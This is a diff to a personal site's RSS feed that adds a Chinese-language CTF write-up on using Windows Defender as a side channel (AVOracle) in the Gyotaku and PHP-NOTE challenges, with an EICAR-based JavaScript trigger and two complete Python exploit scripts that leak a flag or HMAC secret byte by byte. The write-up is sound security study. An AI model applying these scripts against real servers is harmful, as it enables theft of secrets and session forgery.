@@ -6,8 +6,322 @@
     <description>Recent content in n0b0dy&#39;s site on n0b0dy&#39;s site</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 10 Aug 2019 11:34:22 +0800</lastBuildDate>
+    <lastBuildDate>Sat, 31 Aug 2019 20:51:25 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Playing with Windows Defender</title>
+      <link>https://n0b0dycn.me/2019/08/playing-with-windows-defender/</link>
+      <pubDate>Sat, 31 Aug 2019 20:51:25 +0800</pubDate>
+      
+      <guid>https://n0b0dycn.me/2019/08/playing-with-windows-defender/</guid>
+      <description>
+
+&lt;p&gt;本文章总结了TokyoWesterns在WCTF上命的Gyotaku和TWCTF上的PHP-NOTE这两道题涉及的Windows Defender相关的侧信道攻击。&lt;/p&gt;
+
+&lt;h2 id=&#34;windows-defender&#34;&gt;Windows Defender&lt;/h2&gt;
+
+&lt;p&gt;Windows defender是windows上的防护软件，TokyoWesterns在WCTF 2019上提出了一种针对于Windows Defender的侧信道攻击方式AVOracal。&lt;/p&gt;
+
+&lt;h3 id=&#34;windows-defender行为&#34;&gt;windows defender行为&lt;/h3&gt;
+
+&lt;p&gt;根据TokyoWesterns的调研，Windows Defender会进行以下行为：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;检查文件内容中是否有恶意内容&lt;/li&gt;
+&lt;li&gt;改变恶意文件的权限避免用户访问&lt;/li&gt;
+&lt;li&gt;将文件中的恶意内容替换为null&lt;/li&gt;
+&lt;li&gt;删除恶意文件&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;其中在第二步中，如果恶意文件被Windows Defender检测出，用户则不能访问该文件。&lt;/p&gt;
+
+&lt;h3 id=&#34;触发windows-defender&#34;&gt;触发Windows Defender&lt;/h3&gt;
+
+&lt;p&gt;EICAR测试文件可以方便地触发windows defender，其文件内容如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;emulator&#34;&gt;Emulator&lt;/h3&gt;
+
+&lt;p&gt;Windows Defender中的mpengine.dll是Windows Defender的核心dll。其包含对许多文件内容的分析功能，其中包含JScript引擎。该引擎可分析HTML文档，且可以分析其中的JavaScript代码，包括代码中对DOM元素的访问。&lt;/p&gt;
+
+&lt;p&gt;笔者在本机上进行测试，如下内容可以触发Windows Defender：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+var body = document.body.innerHTML;
+var mal = &amp;quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;quot;;
+eval(mal);
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;再访问该文件会被阻止：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\Users\n0b0dy\Desktop&amp;gt; type .\eicar.txt                                                       type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。                                            所在位置 行:1 字符: 1
++ type .\eicar.txt
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo  : ReadError: (C:\Users\n0b0dy\Desktop\eicar.txt:String) [Get-Content], IOException
+    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但是如果不加第二行&lt;code&gt;var body = document.body.innerHTML;&lt;/code&gt;的话，则无法触发Windows Defender。&lt;/p&gt;
+
+&lt;p&gt;下文件会被阻止（通过dom获取最后一个字符）：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+var body = document.body.innerHTML;
+var n = body[0];
+var mal = &amp;quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;quot;+n;
+eval(mal);
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;*&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;而以下文件则不会：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+var body = document.body.innerHTML;
+var n = body[0];
+var mal = &amp;quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;quot;+n;
+eval(mal);
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;a&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;根据该特性，侧信道攻击方式如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;eval(&amp;quot;EICA&amp;quot;+input) -&amp;gt; ?
+    detected -&amp;gt; input is &#39;R&#39;
+    not detected -&amp;gt; input is not &#39;R&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;gyotaku-wctf-2019&#34;&gt;Gyotaku (WCTF 2019)&lt;/h2&gt;
+
+&lt;p&gt;题目链接：&lt;a href=&#34;https://github.com/icchy/wctf2019-gtf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Gyotaku&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;这道题是WCTF中一道让TW很蛋疼的题。该题有一个&lt;code&gt;/flag&lt;/code&gt;路径，只允许127.0.0.1访问。但是题目使用echo框架开发，&lt;code&gt;echo.Context.RealIP&lt;/code&gt;可以被&lt;code&gt;X-Real-IP: 127.0.0.1&lt;/code&gt;欺骗。于是这道题就被全场都做出来了。&lt;/p&gt;
+
+&lt;p&gt;预期解如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;POST /gyotaku&lt;/code&gt;接受url参数，访问该url并将其返回内容储存，具体代码如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// save gyotaku
+gyotakudata := &amp;amp;GyotakuData{
+    URL:      url,
+    Data:     string(body),
+    UserName: username,
+}
+
+buf := bytes.NewBuffer(nil)
+err = gob.NewEncoder(buf).Encode(gyotakudata)
+if err != nil {
+    return err
+}
+err = ioutil.WriteFile(path.Join(GyotakuDir, gid), buf.Bytes(), 0644)
+if err != nil {
+    return err
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;由于我们可以控制url和username，我们构造如下参数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;url=http://127.0.0.1/flag?a=&amp;lt;script&amp;gt;[script]&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;
+username=&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;则可以使生成的文件以被Windows Defender识别。其中&lt;code&gt;[script]&lt;/code&gt;的内容如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{${c}:&#39;*&#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中&lt;code&gt;${c}&lt;/code&gt;是猜测的字符，&lt;code&gt;${idx}&lt;/code&gt;是body中的字符的索引。对每个字符，我们使用二分搜索来加速搜索速度。最终作者给出的exp如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+
+URL = &amp;quot;http://192.168.122.78&amp;quot; # changeme
+
+def randstr(n=8):
+    import random
+    import string
+    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
+    return &#39;&#39;.join([random.choice(chars) for _ in range(n)])
+
+def trigger(c, idx, sess):
+    import string
+    prefix = randstr()
+    p = prefix + &#39;&#39;&#39;&amp;lt;script&amp;gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{${c}:&#39;*&#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;&#39;&#39;&#39;
+    p = string.Template(p).substitute({&#39;idx&#39;: idx, &#39;c&#39;: c})
+    req = sess.post(URL + &#39;/gyotaku&#39;, data={&#39;url&#39;: &#39;http://127.0.0.1/flag?a=&#39; + p})
+    return req.json()
+
+def leak(idx, sess):
+    l, h = 0, 0x100
+    while h - l &amp;gt; 1:
+        m = (h + l) // 2
+        gid = trigger(m, idx, sess)
+        if sess.get(URL + &#39;/gyotaku/&#39; + gid).status_code == 500:
+            l = m
+        else:
+            h = m
+    return chr(l)
+
+sess = requests.session()
+sess.post(URL + &#39;/login&#39;, data={&#39;username&#39;: &#39;&amp;lt;/body&amp;gt;&#39;+randstr(), &#39;password&#39;: randstr()})
+
+data = &#39;&#39;
+for i in range(30):
+    data += leak(i, sess)
+    print(data)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;php-note&#34;&gt;PHP-NOTE&lt;/h2&gt;
+
+&lt;p&gt;由于WCTF的失误，这种攻击方式再TWCTF-2019中又出了一次。&lt;/p&gt;
+
+&lt;p&gt;首先在&lt;code&gt;http://phpnote.chal.ctf.westerns.tokyo/?action=source&lt;/code&gt;中得到题目源码。映入眼帘的是一个反序列化：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;class Note {
+....
+    public function getflag() {
+        if ($this-&amp;gt;isadmin === true) {
+            echo FLAG;
+        }
+    }
+}
+
+if (is_login()) {
+    $realname = $_SESSION[&#39;realname&#39;];
+    $nickname = $_SESSION[&#39;nickname&#39;];
+    
+    $note = verify($_COOKIE[&#39;note&#39;], $_COOKIE[&#39;hmac&#39;])
+            ? unserialize(base64_decode($_COOKIE[&#39;note&#39;]))
+            : new Note(false);
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;其中涉及到一个vertiry，用到一个secret：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function verify($data, $hmac) {
+    $secret = $_SESSION[&#39;secret&#39;];
+    if (empty($secret)) return false;
+    return hash_equals(hash_hmac(&#39;sha256&#39;, $data, $secret), $hmac);
+}
+
+function hmac($data) {
+    $secret = $_SESSION[&#39;secret&#39;];
+    if (empty($data) || empty($secret)) return false;
+    return hash_hmac(&#39;sha256&#39;, $data, $secret);
+}
+
+function gen_secret($seed) {
+    return md5(SALT . $seed . PEPPER);
+}
+.....
+if ($action === &#39;login&#39;) {
+    if ($method === &#39;POST&#39;) {
+        $nickname = (string)$_POST[&#39;nickname&#39;];
+        $realname = (string)$_POST[&#39;realname&#39;];
+
+        if (empty($realname) || strlen($realname) &amp;lt; 8) {
+            die(&#39;invalid name&#39;);
+        }
+
+        $_SESSION[&#39;realname&#39;] = $realname;
+        if (!empty($nickname)) {
+            $_SESSION[&#39;nickname&#39;] = $nickname;
+        }
+        $_SESSION[&#39;secret&#39;] = gen_secret($nickname);
+    }
+    redirect(&#39;index&#39;);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可知secret只与nickname有关。但是我们没法攻击hmac函数来获得secret。在看了一圈之后，我们发现服务器是IIS的：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/7.3.9
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;结合前文所述攻击手法，整理思路如下：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;PHP的session储存在文件系统中&lt;/li&gt;
+&lt;li&gt;向session中注入恶意内容让Windows Defender屏蔽生成的session文件&lt;/li&gt;
+&lt;li&gt;通过能否登录成功，我们可以逐字节泄露secret。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;仿照Gyotaku的攻击脚本我们很容易写出exp：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;#!/usr/bin/env python3
+
+import requests
+
+CHAL_URL = &amp;quot;http://phpnote.chal.ctf.westerns.tokyo/&amp;quot;
+TEST_URL = &amp;quot;http://192.168.21.132/&amp;quot;
+
+def trigger(c, idx, payload=&#39;&#39;):
+    sess = requests.Session()
+    import string
+    payload = &#39;&#39;&#39;--!&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;script&amp;gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{${c}:&#39;*&#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&#39;&#39;&#39;
+    payload = string.Template(payload).substitute({&#39;idx&#39;: idx, &#39;c&#39;: c})
+    d1 = {
+        &amp;quot;nickname&amp;quot;: &amp;quot;&amp;quot;,
+        &amp;quot;realname&amp;quot;: payload,
+    }
+    resp = sess.post(CHAL_URL + &amp;quot;?action=login&amp;quot;, data=d1)
+    d = {
+        &amp;quot;nickname&amp;quot;: &amp;quot;1&amp;lt;/body&amp;gt;&amp;quot;,
+        &amp;quot;realname&amp;quot;: payload,
+    }
+    resp = sess.post(CHAL_URL + &amp;quot;?action=login&amp;quot;, data=d)
+    resp = sess.get(CHAL_URL + &amp;quot;?action=index&amp;quot;)
+    # print(sess.cookies)
+    return &amp;quot;logout&amp;quot; not in resp.text
+
+def leak(idx):
+    l, h = 0, 0x100
+    while h - l &amp;gt; 1:
+        m = (h + l) // 2
+        res = trigger(m, idx)
+        if res:
+            l = m
+        else:
+            h = m
+    return chr(l)
+
+data = &amp;quot;&amp;quot;
+for i in range(13,100):
+    data += leak(i)
+    print(data)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;成功将secret泄露出：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  twctf-19 ./exp-phpnote.py                                                                     
+:
+:&amp;quot;
+:&amp;quot;7
+:&amp;quot;7d
+:&amp;quot;7da
+:&amp;quot;7dae
+........
+:&amp;quot;7daeeed052fd2908fb30f462ad1c7936
+:&amp;quot;7daeeed052fd2908fb30f462ad1c7936&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后构造反序列化即可得到flag。&lt;/p&gt;
+
+&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://i.blackhat.com/us-18/Thu-August-9/us-18-Bulazel-Windows-Offender-Reverse-Engineering-Windows-Defenders-Antivirus-Emulator.pdf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Windows Offender: Reverse Engineering Windows Defender&amp;rsquo;s Antivirus Emulator&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;WCTF2019: Gyotaku Writeup&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>Defcon 27游记</title>
@@ -302,7 +616,7 @@ MODULE UNLOAD exp
 
 &lt;p&gt;Tianyi Li&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&#34;http://www.icst.pku.edu.cn/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Wangxuan Institute of Computer Technology, Peking University&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;http://www.icst.pku.edu.cn/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Wangxuan Institute of Computer Technology&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://www.pku.edu.cn/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Peking University&lt;/a&gt;&lt;/p&gt;
 
@@ -318,7 +632,7 @@ MODULE UNLOAD exp
 &lt;li&gt;&lt;p&gt;&lt;strong&gt;2018 - present&lt;/strong&gt;, Peking University (PKU)&lt;/p&gt;
 
 &lt;ul&gt;
-&lt;li&gt;Institute of Computer Science &amp;amp; Technology (ICST).&lt;/li&gt;
+&lt;li&gt;Wangxuan Institute of Computer Technology (WICT).&lt;/li&gt;
 &lt;li&gt;Master of Science in Computer Application Technology&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
 
